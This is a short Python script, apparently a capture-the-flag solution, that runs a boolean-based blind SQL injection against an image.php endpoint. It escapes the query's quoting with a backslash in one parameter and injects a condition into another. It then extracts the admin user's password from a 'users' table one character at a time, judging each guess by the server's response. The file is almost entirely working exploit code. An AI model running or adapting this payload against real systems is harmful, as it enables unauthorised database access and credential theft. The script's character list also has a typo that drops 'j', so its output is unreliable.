import requests,time

characters = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'    #匹配用的字符串
if __name__ == "__main__":
    url = "http://547e68cd-05ff-41a6-9699-f82ecacc03c4.node3.buuoj.cn/image.php?id=\\0&path="
    result=""
    for i in range(1,23):
        for character in characters:
            path="+or+1%3dif(ascii(substr((select password from ciscnfinal.users where username=char(97,100,109,105,110) limit 0,1),{},1))%3d{},1,0)%23".format(i,ord(character))
            response = requests.get(url=url+path)
            if(b"H" in response.content):
                result+=character
                break
            
        print(result)